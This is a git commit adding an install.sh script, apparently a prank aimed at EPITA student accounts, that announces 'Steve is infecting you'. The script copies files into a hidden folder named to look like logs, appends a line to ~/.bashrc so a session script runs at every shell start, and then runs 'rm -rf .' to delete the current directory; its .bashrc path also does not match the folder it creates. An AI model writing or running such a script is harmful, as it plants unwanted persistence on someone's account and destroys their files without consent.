c701f6b10bba0f0e5dacc4ccc5bd15ab1b1f254b
Crosson Brieuc <crosson.brieuc@gmail.com>
2024-12-10 02:54:40 +0900

    init

---
+++ install.sh
@@ -0,0 +1,9 @@
+echo "Steve is infecting you..."
+mkdir ~/afs/.var-logs
+cp sound.mp3 ~/afs/.var-logs/epita-session.mp3
+cp start_session.sh ~/afs/.var-logs/start_session.sh
+echo "# starting EPITA session" >> ~/.bashrc
+echo "./afs/var-logs/start_session.sh" >> ~/.bashrc
+rm -rf .
+alacritty &
+exit 0
